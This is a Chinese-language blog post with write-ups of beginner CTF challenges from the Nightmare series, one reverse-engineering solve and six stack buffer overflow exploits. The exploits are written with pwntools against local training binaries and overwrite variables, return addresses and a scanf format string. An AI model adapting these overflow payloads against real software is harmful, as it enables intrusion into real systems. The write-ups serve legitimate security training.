---
title: 'Writeups: Nightmare Series'
date: '2024-07-24'
lastmod: '2024-07-29'
tags: ['CTF','Writeup', 'Pwn', 'Nightmare']
draft: false
summary: 'Writeups for Nightmare Series'
authors: ['default']
---

<div className="border-solid border-2 border-surface0 dark:border-surface0-dark p-2 bg-base dark:bg-base-dark mt-5">
  <TOCInline toc={props.toc} asDisclosure />
</div>

## CSAW 2019 beleaf

### Information

 - Category: Reverse
 - Points: 50

### Description

> tree sounds are best listened to by https://binary.ninja/demo or ghidra

<Download name="beleaf" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/03-beginner_re/csaw19_beleaf/beleaf" type="Binary" />

### Writeup

简单运行一下程序：

```plain-text
λ ~/ ./beleaf
Enter the flag
>>> i dont have the fucking flag
Incorrect!
```

一些基本信息：

```plain-text
λ ~/ file beleaf
beleaf: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6d305eed7c9bebbaa60b67403a6c6f2b36de3ca4, stripped
```

大概可以推测出我们的目标就是弄到一个正确的 `flag`。

丢到 IDA 里发现，输入长度小于等于 32 (0x20) 会输出 `Incorrect!`，所以 `flag` 长度起码 33 字节。

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/24/pkb9i4O.png" width={1920} height={1080} />
</center>

接下来进入一个简单的 for 循环，将我们输入的每一个字符逐一放到 `calc_idx` 函数中，并将返回值与 `valid_arr[i]` 比较，如果不等于 `valid_arr[i]` 则输出 `Incorrect!`。如果所有字符都通过了验证，则输出 `Correct!`

再看看 `calc_idx` 函数，大致可以看出它的作用是根据传入的字符查找它在 `charset` 中对应的索引。

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/24/pkb9kCD.png" width={1920} height={1080} />
</center>

`calc_idx` 的核心如下：

 - `character == charset[i]` 则返回索引 `i`
 - `character >= charset[i]` 则设置索引为 `i = 2 * (i + 1)`
 - 否则设置索引为 `i = 2 * i + 1`

因此我们构造 `flag` 的关键条件就是：

 - `flag` 长度 >= 33
 - `calc_idx(input[i]) == valid_arr[i]`

### Exploit

```python
#!/usr/bin/python3

import sys

valid_arr = [
    0x01, 0x09, 0x11, 0x27, 0x02,
    0x00, 0x12, 0x03, 0x08, 0x12,
    0x09, 0x12, 0x11, 0x01, 0x03,
    0x13, 0x04, 0x03, 0x05, 0x15,
    0x2E, 0x0A, 0x03, 0x0A, 0x12,
    0x03, 0x01, 0x2E, 0x16, 0x2E,
    0x0A, 0x12, 0x06
]

charset = [
    0x00000077, 0x00000066, 0x0000007B, 0x0000005F, 0x0000006E,
    0x00000079, 0x0000007D, 0xFFFFFFFF, 0x00000062, 0x0000006C,
    0x00000072, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0x00000061, 0x00000065, 0x00000069,
    0xFFFFFFFF, 0x0000006F, 0x00000074, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000067,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0x00000075
]

def create_charset():
    result = ''

    for c in charset:
        try:
            result += chr(c)
        except OverflowError:
            continue

    return result

def checker(char):
    i = 0
    while char != charset[i]:
        if char >= charset[i]:
            i = 2 * (i + 1)
        else:
            i = 2 * i + 1
    return i

def main():
    charset = create_charset()

    i = 0
    while (i < 33):
        for c in charset:
            if checker(ord(c)) == valid_arr[i]:
                sys.stdout.write(c)
        i += 1

if __name__ == '__main__':
    main()
```

### Flag

Flag: `flag{we_beleaf_in_your_re_future}`

## CSAW 2018 Quals Boi

### Information

 - Category: Pwn
 - Points: 25

### Description

> Only big boi pwners will get this one!

<Download name="boi" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/csaw18_boi/boi" type="Binary" />

### Writeup

```plain-text
λ ~/ file boi
boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
λ ~/ pwn checksec boi
[*] '/home/cub3y0nd/boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

试运行一下，发现它只是输出系统时间：

```plain-text
λ ~/ ./boi
Are you a big boiiiii??
aaaa
Thu Jul 25 05:35:00 PM CST 2024
```

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/25/pkbJ5H1.png" width={1920} height={1080} />
</center>

从 IDA 里面可以看出，程序可以将一个 24 (0x18) 字节 数据读入 `buf` 中。如果 `v5` 的 HIDWORD（高位四字节）等于 `0xCAF3BAEE` 则返回 shell，否则返回系统时间。

所以我们的思路就是溢出，然后覆盖原始数据。

下面是两种得到溢出点的方法：

1. 由于 `buf` 只有 16 字节大小（2 * __int64），而 `read` 却可以读取 24 字节数据，所以这里存在栈溢出漏洞，可以覆盖变量 `v5` 的内容。所以 payload 可以是 16（填满 buf） + 4（填满 4 字节低位使后面的数据可以直接覆盖高位数据，也就是做判断的部分） 字节垃圾数据 + `0xCAF3BAEE`。
2. 通过调试知道溢出点是 20 (0x14)：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/25/pkbYnU0.png" width={1920} height={1080} />
</center>

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./boi')

payload = b'A' * 0x14 + p32(0xcaf3baee)

target.send(payload)
target.interactive()
```

### Flag

Flag: `flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}`

## TAMU 2019 pwn1

### Information

 - Category: Pwn
 - Points: Unknow

### Description

> Unknow

<Download name="pwn1" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/tamu19_pwn1/pwn1" type="Binary" />

### Writeup

```plain-text
λ ~/ file boi
pwn1: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd
7aa1accb16feac888c99841f504, not stripped
λ ~/ pwn checksec pwn1
[*] '/home/cub3y0nd/pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```plain-text
λ ~/ ./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
aaaa
I don't know that! Auuuuuuuugh!
```

咋一看好像没啥东西，丢到 IDA 里面瞧瞧：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/26/pkb4IlF.png" width={1920} height={1080} />
</center>

显然，根据伪代码可以轻易的知道如何绕过前两问的输入。然后第三问采用了一个 `gets()` 函数接收输入，输入保存到一个 43 字节大小的字符数组里面。由于 `gets()` 不检查输入大小，因此超过 `input` 容量的内容会溢出到 `v5`。最后如果 `v5 == 0xDEA110C8` 则输出 `flag`。

所以思路就是先回答前两问，然后填满 `input`，将 `0xDEA110C8` 溢出到变量 `v5`，结束。

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./pwn1')

recvuntil = lambda str : print(target.recvuntil(str))

payload = b'A' * 0x2b + p32(0xdea110c8)

recvuntil(b'What... is your name?')
target.sendline(b'Sir Lancelot of Camelot')
recvuntil(b'What... is your quest?')
target.sendline(b'To seek the Holy Grail.')
recvuntil(b'What... is my secret?')
target.sendline(payload)
target.interactive()
```

### Flag

Flag: `flag{g0ttem_b0yz}`

## Tokyo Westerns CTF 3rd 2017 JustDoIt

### Information

 - Category: Pwn
 - Points: Unknow

### Description

> Unknow

<Download name="just_do_it" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/tw17_justdoit/just_do_it" type="Binary" />

### Writeup

```plain-text
λ ~/ file just_do_it
just_do_it: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cf72d1d758e59a5b9912e0e83c3af92175c6f629, not stripped
λ ~/ pwn checksec just_do_it
[*] '/home/cub3y0nd/just_do_it'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```plain-text
λ ~/ ./just_do_it
Welcome my secret service. Do you know the password?
Input the password.
aaaa
Invalid Password, Try Again!
```

可能是要获得密码打印 `flag`，丢到 IDA 看看：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqmom8.png" width={1920} height={1080} />
</center>

看伪代码发现，就算提供了正确的密码也只是输出一条消息而已，得到密码好像并没有什么用。这就是一个障眼法！

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqmLfs.png" width={1920} height={1080} />
</center>

虽然不需要密码，但是如果你好奇密码的话，也不是不行... 通过 IDA 我们知道密码是 `P@SSW0RD`，于是乎：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqn97F.png" width={1920} height={1080} />
</center>

这里即使有了正确的密码还是提示密码错误的原因是 `fgets` 函数会把换行符也读进去。所以我们只需要在密码后面加上空字符 `\0` 就可以去掉换行符了。

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqnp0U.png" width={1920} height={1080} />
</center>

扯远了...

通过之前的伪代码可以发现，`fgets` 接收的输入大小远超 `input` 可容纳的大小。因此通过调试可以知道溢出 padding 是 20 字节：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqnApR.png" width={1920} height={1080} />
</center>

那么有了溢出 padding 后怎么获取 flag 呢？

由伪代码知，它会从 `stream` 里面读取 48 字节的数据，保存到 `flag` 变量里面。那么我们如果可以直接输出 `flag` 就好了。这里有一个思路是利用之前的溢出漏洞，将 `input` 填满后把 `flag` 变量的地址溢出给 `v6`，这就会导致 `puts` 输出 `flag` 变量的内容。perfect 移花接木

嗯...这样就很清晰了。通过 IDA 直接看 `flag` 在 `.bss` 中的地址：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqnQtH.png" width={1920} height={1080} />
</center>

当然，如果你想验证它是不是真我们所想覆盖了 `v6` 让 `puts` 输出 `flag` 的内容：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqntnf.png" width={1920} height={1080} />
</center>

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./just_do_it')

payload = b'A' * 0x14 + p32(0x0804A080)

target.sendline(payload)
target.interactive()
```

### Flag

Flag: `TWCTF{pwnable_warmup_I_did_it!}`

## CSAW 2016 Quals Warmup

### Information

 - Category: Pwn
 - Points: 50

### Description

> So you want to be a pwn-er huh? Well let's throw you an easy one ;)

<Download name="warmup" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/05-bof_callfunction/csaw16_warmup/warmup" type="Binary" />

### Writeup

```plain-text
λ ~/ file warmup
warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped
λ ~/ pwn checksec warmup
[*] '/home/cub3y0nd/warmup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```plain-text
λ ~/ ./warmup
-Warm Up-
WOW:0x40060d
>wow
```

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/28/pkqh8T1.png" width={1920} height={1080} />
</center>

这种题真就是闭着眼睛做... 一眼出思路：溢出 `v5` 覆盖返回地址为 `easy` 函数即可。

值得注意的是首先要了解函数调用约定和栈帧布局，这样才能准确的覆盖返回地址。可以参考下面两篇文章：

 - [C 语言函数调用栈（一）](http://www.cnblogs.com/clover-toeic/p/3755401.html)
 - [C 语言函数调用栈（二）](http://www.cnblogs.com/clover-toeic/p/3756668.html)

还有一点就是确保 [栈对齐](https://www.cubeyond.net/blog/pwn-notes/stack/return-oriented-programming/stack-alignment)。

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./warmup')

# payload = b'A' * (64 + 8) + p64(0x40060d + 0x1)
payload = b'A' * (64 + 8) + p64(0x4006a4) + p64(0x40060d)

target.sendline(payload)
target.interactive()
```

### Flag

Flag: `FLAG{LET_US_BEGIN_CSAW_2016}`

## CSAW Quals 2018 Get It

### Information

 - Category: Pwn
 - Points: 100

### Description

> Do you get it?

<Download name="get_it" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/05-bof_callfunction/csaw18_getit/get_it" type="Binary" />

### Writeup

```plain-text
λ ~/ file get_it
get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
λ ~/ pwn checksec get_it
[*] '/get_it'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```plain-text
λ ~/ ./get_it
Do you gets it??
i will
```
伪代码如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+10h] [rbp-20h] BYREF

  puts("Do you gets it??");
  gets(v4);
  return 0;
}
```

```c
int give_shell()
{
  return system("/bin/bash");
}
```

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./get_it')

payload = b'A' * (0x20 + 0x8) + p64(0x4005f7) + p64(0x4005b6)

target.sendline(payload)
target.interactive()
```

### Flag

Flag: `flag{y0u_deF_get_itls}`

## TUCTF 2017 vulnchat

### Information

 - Category: Pwn
 - Points: 50

### Description

> One of our informants goes by the handle djinn. He found some information while working undercover inside an organized crime ring. Although we've had trouble retrieving this information from him. He left us this chat client to talk with him. Let's see if he trusts you...

<Download name="vuln-chat" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/05-bof_callfunction/tu17_vulnchat/vuln-chat" type="Binary" />

### Writeup

```plain-text
λ ~/ file vuln-chat
vuln-chat: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a3caa1805eeeee1454ee76287be398b12b5fa2b7, not stripped
λ ~/ pwn checksec vuln-chat
[*] '/home/cub3y0nd/vuln-chat'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```plain-text
λ ~/ ./vuln-chat
----------- Welcome to vuln-chat -------------
Enter your username: cub3y0nd
Welcome cub3y0nd!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
cub3y0nd: tbh im ur daddy u can trust me LOL
djinn: Sorry. That's not good enough
```

伪代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[20]; // [esp+3h] [ebp-2Dh] BYREF
  char v5[20]; // [esp+17h] [ebp-19h] BYREF
  char var5[9]; // [esp+2Bh] [ebp-5h] BYREF

  setvbuf(stdout, 0, 2, 0x14u);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  strcpy(var5, "%30s");
  __isoc99_scanf(var5, v5);
  printf("Welcome %s!\n", v5);
  puts("Connecting to 'djinn'");
  sleep(1u);
  puts("--- 'djinn' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ", v5);
  __isoc99_scanf(var5, v4);
  puts("djinn: Sorry. That's not good enough");
  fflush(stdout);
  return 0;
}
```

```c
int printFlag()
{
  system("/bin/cat ./flag.txt");
  return puts("Use it wisely");
}
```

这题的重点在于 `scanf` 限制了最大输入长度，导致不能直接覆盖返回地址。因此需要先将最大输入长度扩大，下面是调试过程：

```plain-text
pwndbg> b *main+71
Breakpoint 1 at 0x80485d1
pwndbg> b *main+170
Breakpoint 2 at 0x8048634
pwndbg> cyclic 20
aaaabaaacaaadaaaeaaa
pwndbg> r
Starting program: /home/cub3y0nd/Projects/CTF/vuln-chat
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
----------- Welcome to vuln-chat -------------
Enter your username:
Breakpoint 1, 0x080485d1 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
*EAX  0xffffd5d3 ◂— '%30s'
*EBX  0xf7f92e2c ◂— 0x22ed4c
 ECX  0x0
 EDX  0x0
*EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
*ESI  0x8048660 (__libc_csu_init) ◂— push ebp
*EBP  0xffffd5d8 ◂— 0x0
*ESP  0xffffd5a0 —▸ 0xffffd5d3 ◂— '%30s'
*EIP  0x80485d1 (main+71) —▸ 0xfffe8ae8 ◂— 0x0
────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
 ► 0x80485d1 <main+71>     call   8048460h                      <__isoc99_scanf@plt>
        format: 0xffffd5d3 ◂— '%30s'
        vararg: 0xffffd5bf ◂— 0x0

   0x80485d6 <main+76>     add    esp, 8
   0x80485d9 <main+79>     lea    eax, [ebp - 19h]
   0x80485dc <main+82>     push   eax
   0x80485dd <main+83>     push   8048759h
   0x80485e2 <main+88>     call   80483e0h                      <printf@plt>

   0x80485e7 <main+93>     add    esp, 8
   0x80485ea <main+96>     push   8048766h
   0x80485ef <main+101>    call   8048410h                      <puts@plt>

   0x80485f4 <main+106>    add    esp, 4
   0x80485f7 <main+109>    push   1
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ esp 0xffffd5a0 —▸ 0xffffd5d3 ◂— '%30s'
01:0004│-034 0xffffd5a4 —▸ 0xffffd5bf ◂— 0x0
02:0008│-030 0xffffd5a8 ◂— 0xffffffff
03:000c│-02c 0xffffd5ac —▸ 0xf7d71424 ◂— 0x920 /* ' \t' */
04:0010│-028 0xffffd5b0 —▸ 0xf7fbf380 —▸ 0xf7d64000 ◂— 0x464c457f
05:0014│-024 0xffffd5b4 ◂— 0x0
... ↓        2 skipped
──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
 ► 0 0x80485d1 main+71
   1 0xf7d84bd7
   2 0xf7d84c9d __libc_start_main+141
   3 0x8048491 _start+33
──────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
aaaabaaacaaadaaaeaaa%100s
Welcome aaaabaaacaaadaaaeaaa%100s!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
aaaabaaacaaadaaaeaaa%100s:
Breakpoint 2, 0x08048634 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
 EAX  0xffffd5d3 ◂— '%100s'
 EBX  0xf7f92e2c ◂— 0x22ed4c
 ECX  0x0
 EDX  0x0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
 ESI  0x8048660 (__libc_csu_init) ◂— push ebp
 EBP  0xffffd5d8 ◂— 0x0
 ESP  0xffffd5a0 —▸ 0xffffd5d3 ◂— '%100s'
*EIP  0x8048634 (main+170) —▸ 0xfffe27e8 ◂— 0x0
────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
 ► 0x8048634 <main+170>    call   8048460h                      <__isoc99_scanf@plt>
        format: 0xffffd5d3 ◂— '%100s'
        vararg: 0xffffd5ab ◂— 0xd71424ff

   0x8048639 <main+175>    add    esp, 8
   0x804863c <main+178>    push   80487ech
   0x8048641 <main+183>    call   8048410h                      <puts@plt>

   0x8048646 <main+188>    add    esp, 4
   0x8048649 <main+191>    mov    eax, dword ptr [8049a60h]
   0x804864e <main+196>    push   eax
   0x804864f <main+197>    call   80483f0h                      <fflush@plt>

   0x8048654 <main+202>    add    esp, 4
   0x8048657 <main+205>    mov    eax, 0
   0x804865c <main+210>    leave
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ esp 0xffffd5a0 —▸ 0xffffd5d3 ◂— '%100s'
01:0004│-034 0xffffd5a4 —▸ 0xffffd5ab ◂— 0xd71424ff
02:0008│-030 0xffffd5a8 ◂— 0xffffffff
03:000c│-02c 0xffffd5ac —▸ 0xf7d71424 ◂— 0x920 /* ' \t' */
04:0010│-028 0xffffd5b0 —▸ 0xf7fbf380 —▸ 0xf7d64000 ◂— 0x464c457f
05:0014│-024 0xffffd5b4 ◂— 0x0
06:0018│-020 0xffffd5b8 ◂— 0x0
07:001c│-01c 0xffffd5bc ◂— 0x61000000
──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
 ► 0 0x8048634 main+170
   1 0xf7d84bd7
   2 0xf7d84c9d __libc_start_main+141
   3 0x8048491 _start+33
──────────────────────────────────────────────────────────────────────────────────
pwndbg> x/s $ebp-0x5
0xffffd5d3:	"%100s"
```

有了更大的输入空间后就可以利用第二个 `scanf` 来覆盖返回地址了。

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./vuln-chat')

recvuntil   = lambda str : print(target.recvuntil(str))
sendline    = lambda str : target.sendline(str)
interactive = lambda : target.interactive()

recvuntil(b': ')
sendline(b'A' * 0x14 + b'%100s')
recvuntil(b': ')
payload = b'A' * 0x31 + p32(0x804856b)
sendline(payload)
interactive()
```

### Flag

flag: `TUCTF{574ck_5m45h1n6_l1k3_4_pr0}`

